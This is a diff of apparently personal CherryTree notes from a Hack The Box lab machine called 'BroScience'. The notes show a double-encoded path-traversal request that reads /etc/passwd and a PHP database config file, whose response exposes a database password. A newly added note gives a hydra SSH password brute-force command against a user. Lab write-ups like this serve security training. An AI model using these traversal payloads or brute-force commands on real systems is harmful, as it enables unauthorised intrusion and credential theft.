@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
   <bookmarks list=""/>
-  <node name="BroScience" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675102644" ts_lastsave="1675103235">
+  <node name="BroScience" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675102644" ts_lastsave="1675266711">
     <rich_text>IP: 10.10.11.195
 OS: Debian
 tech: php
@@ -198,7 +198,9 @@ on visiting the following  </rich_text>
 
 on using the double encoded payload we dont get the error message
 
-&#13;
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>&#13;
 
 </rich_text>
       <codebox char_offset="94" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> /index.php            (Status: 200) [Size: 163423]
@@ -362,7 +364,7 @@ Accept-Encoding: gzip, deflate&#13;
 Accept-Language: en-US,en;q=0.9&#13;
 Connection: close</codebox>
     </node>
-    <node name="LFI" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675202312" ts_lastsave="1675204962">
+    <node name="LFI" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675202312" ts_lastsave="1675205015">
       <rich_text>On using double encoded payload for </rich_text>
       <rich_text family="monospace">../../../../../etc/passwd </rich_text>
       <rich_text>we see that lfi works
@@ -373,7 +375,9 @@ Connection: close</codebox>
 
 we get the following output:
 
-
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
 
 from the output we see that we have a user named bill
 
@@ -386,6 +390,13 @@ so let check encoded ../../../../../var/www/html/includes/db_connect.php
 request:
 
 </rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+
+we get the following response
+
+</rich_text>
+      <rich_text justification="left"></rich_text>
       <codebox char_offset="85" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">GET /includes/img.php?path=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34 HTTP/1.1&#13;
 Host: broscience.htb&#13;
 Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"&#13;
@@ -462,9 +473,32 @@ Sec-Fetch-User: ?1&#13;
 Sec-Fetch-Dest: document&#13;
 Accept-Encoding: gzip, deflate&#13;
 Accept-Language: en-US,en;q=0.9&#13;
+Connection: close</codebox>
+      <codebox char_offset="352" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">HTTP/1.1 200 OK&#13;
+Date: Tue, 31 Jan 2023 22:41:06 GMT&#13;
+Server: Apache/2.4.54 (Debian)&#13;
+Content-Length: 337&#13;
 Connection: close&#13;
+Content-Type: image/png&#13;
 &#13;
-</codebox>
+&lt;?php
+$db_host = "localhost";
+$db_port = "5432";
+$db_name = "broscience";
+$db_user = "dbuser";
+$db_pass = "RangeOfMotion%777";
+$db_salt = "NaCl";
+
+$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");
+
+if (!$db_conn) {
+    die("&lt;b&gt;Error&lt;/b&gt;: Unable to connect to database");
+}
+?&gt;</codebox>
+    </node>
+    <node name="sshBruteforce" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675266711" ts_lastsave="1675266735">
+      <rich_text family="monospace">hydra -l bill -P /usr/share/wordlists/rockyou.txt ssh://</rich_text>
+      <rich_text>broscience.htb</rich_text>
     </node>
   </node>
 </cherrytree>
